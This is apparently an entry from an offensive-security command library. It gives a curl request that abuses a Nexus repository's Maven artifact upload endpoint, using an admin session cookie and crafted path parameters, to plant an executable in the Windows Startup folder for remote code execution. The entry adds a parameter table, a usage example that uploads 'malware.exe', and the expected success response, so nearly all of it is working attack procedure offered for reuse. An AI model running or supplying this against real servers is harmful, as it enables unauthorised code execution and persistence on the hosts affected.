---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  curl -X POST
  'http://nexus-host:8081/nexus/service/local/artifact/maven/content' -H
  'Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770' -F 'r=5000' -F
  'g=Programs' -F 'a=Startup' -F 'v=.' -F 'p=jar' -F 'c=637' -F 'e=exe' -F
  'file=@calc.exe'
tags:
  - nexus
  - artifact-upload
  - rce
type: command
output: |-
  HTTP/1.1 201 Created
  Content-Type: application/json
  {"groupId":"Programs","artifactId":"Startup","version":".","packaging":"jar"}
executor: bash
platforms:
  - Web
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:10.444Z'
verified: false
validated: true
submitted: true
---
# curl-upload-artifact-to-startup

## Command

```bash
curl -X POST 'http://nexus-host:8081/nexus/service/local/artifact/maven/content' \
  -H 'Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770' \
  -F 'r=5000' \
  -F 'g=Programs' \
  -F 'a=Startup' \
  -F 'v=.' \
  -F 'p=jar' \
  -F 'c=637' \
  -F 'e=exe' \
  -F 'file=@calc.exe'
```

## Description

Uploads an executable file to a custom Nexus repository using Maven parameters to control the path, placing it in the Windows Startup folder for RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for upload | Yes |
| `http://nexus-host:8081/nexus/service/local/artifact/maven/content` | Artifact upload endpoint | Yes |
| `-H 'Cookie: NXSESSIONID=...'` | Admin session cookie | Yes |
| `-F 'r=5000'` | Repository ID | Yes |
| `-F 'g=Programs'` | Group ID (first path level) | Yes |
| `-F 'a=Startup'` | Artifact ID (second path level) | Yes |
| `-F 'v=.'` | Version (third path level, dot for current) | Yes |
| `-F 'p=jar'` | Packaging type | Yes |
| `-F 'c=637'` | Classifier (path component) | Yes |
| `-F 'e=exe'` | Extension | Yes |
| `-F 'file=@calc.exe'` | File to upload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://nexus-host:8081/nexus/service/local/artifact/maven/content' -H 'Cookie: NXSESSIONID=your-session' -F 'r=5000' -F 'g=Programs' -F 'a=Startup' -F 'v=.' -F 'file=@malware.exe'
```

### Advanced Usage

Include all params as shown for full path control and metadata.

## Expected Output

HTTP 201 Created with JSON reflecting the uploaded artifact details; file written to target path.

## Related

- [[procedures/Upload-Executable-to-Windows-Startup-Folder-via-Maven-Artifact]]
